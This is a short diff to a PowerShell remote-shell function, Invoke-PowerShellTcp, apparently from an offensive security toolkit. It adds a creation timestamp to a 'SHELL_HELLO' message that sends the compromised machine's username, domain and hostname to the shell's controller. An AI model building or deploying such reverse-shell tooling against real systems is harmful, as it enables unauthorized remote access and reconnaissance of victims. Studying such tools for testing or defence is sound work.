@@ -32,6 +32,7 @@ function Invoke-PowerShellTcp
 
     $id = ''
     1..4 | %{ $id += '{0:x}' -f (Get-Random -Max 256) }
+    $creation_time = Get-Date -Format r
 
     function Read-ShellPacket {
         param (
@@ -76,6 +77,7 @@ function Invoke-PowerShellTcp
             "msg_type" = "SHELL_HELLO"
             "data" = @{
                 "id" = $id
+                "created" = $creation_time
                 "user" = "$ENV:USERNAME"
                 "domain" = "$ENV:USERDOMAIN"
                 "hostname" = "$ENV:COMPUTERNAME"
